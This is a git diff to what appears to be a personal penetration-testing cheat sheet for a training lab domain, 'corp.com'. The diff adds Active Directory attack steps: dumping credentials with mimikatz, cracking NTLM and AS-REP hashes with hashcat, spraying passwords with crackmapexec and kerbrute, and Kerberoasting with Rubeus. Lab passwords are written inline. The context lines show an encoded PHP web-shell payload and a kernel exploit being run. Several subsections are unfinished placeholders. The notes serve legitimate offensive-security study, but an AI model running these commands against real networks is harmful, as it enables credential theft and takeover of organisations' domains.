@@ -1044,7 +1044,7 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
   - Obtain a root shell via kernel exploit    
     `joe@ubuntu-privesc:~$ ./cve-2017-16995`  
 
-# Active directory  
+# Active directory enumeration
 Login to DC  
 - Local user: hostname\username  
 - Domain user: DOMAIN\username  
@@ -1142,7 +1142,9 @@ Login to DC
     PS C:\Users\stephanie\Downloads> Import-Module .\Sharphound.ps1  
     ```
   - Extract the bloodhound json files.zip  
-    `PS C:\Users\stephanie\Downloads> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"`  
+    `PS C:\Users\stephanie\Downloads> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"`  OR
+    `.\SharpHound.exe -c All`
+    ``
   - Start  BloodHound
     ```
     cd /home/kali/offsec/active_directory
@@ -1150,6 +1152,72 @@ Login to DC
     ```
   - Login http://127.0.0.1:8080/ui/login (admin,Admin12345678!)
   - Upload the audit_xxx.zip http://127.0.0.1:8080/ui/administration/file-ingest (delete from database management first)  
+
+# Active directory authentication attack   
+- Cached AD credentials
+  - **Local admin (jeff)** on **client75**  
+    `xfreerdp3 /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.200.75 /cert:ignore /drive:share,/home/kali/share`
+  - start mimikatz with admin mode and dump credentials
+    ```
+    PS C:\Tools\> .\mimikatz.exe
+    log C:\Users\jeff\Desktop\creds.txt
+    privilege::debug
+    sekurlsa::logonpasswords
+    log off
+    ```
+  - retrieve unique ntlm for each users  
+    ```
+    Get-Content C:\Users\<user>\Desktop\creds.txt |
+    Select-String -Pattern "Username|NTLM" |
+    ForEach-Object { $_.Line.Trim() } |
+    Select-Object -Unique
+    ```
+  - crack the hash **1000 hashes.ntlm**
+    ```
+    nano hashes.txt (only NTLM value)
+    hashcat -m 1000 hashes.ntlm.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force     
+    ```
+- Password spray & authentication checks
+  - check password policy
+    `net accounts`
+  - spray the **credentails** of user against all domain joined machines
+    ```
+    #option 1 - Spray-Passwords 
+    PS C:\Tools> powershell -ep bypass
+    PS C:\Tools> .\Spray-Passwords.ps1 -Pass Nexus123! -Admin
+    
+    #option 2 - crackapexec
+    kali@kali:~$ crackmapexec smb <192.168.188.70-192.168.188.76> -u <user> -p '<password>' -d corp.com --continue-on-success
+    kali@kali:~$ crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com #check for (Pwn3d!) admin priviledge
+
+    #option 3 - Kerbrute
+    PS C:\Tools> type .\usernames.txt
+    PS C:\Tools> .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
+    ```
+- Kerberos attacks
+  - ddd
+    `Get-NetUser -SPN | select samaccountname,serviceprincipalname`
+  - ddd
+    `.\Rubeus.exe kerberoast /outfile:hashes.krb`
+  - crack kerberoast
+- AS-REP roast (accounts without preauth)
+  - **DC1 pete**
+    `xfreerdp3 /u:pete /d:corp.com /p:'Nexus123!' /v:192.168.200.70 /cert:ignore /drive:share,/home/kali/share`  
+  - Find Vulnerable Users Does not require Kerberos preauthentication
+    ```
+    PS C:\Tools> powershell -ep bypass
+    PS C:\Tools> Import-Module .\PowerView.ps1
+    Get-DomainUser -PreauthNotRequired | select samaccountname  #dave
+    ```
+  - using 'pete' credential to request AS-REP hashes for 'dave'   
+    `kali@kali:~$ impacket-GetNPUsers -dc-ip 192.168.188.70  -request -outputfile hashes.asreproast corp.com/pete`  
+  - crack the hash **18200 hashes.asreproast**
+    `kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
+  - Alternate tool - Rubeus
+    `PS C:\Tools> .\Rubeus.exe asreproast /nowrap`  
+- Silver tickets
+- Domain controller synchonization  
+
 
 # Lateral movement  
 - Login to DC
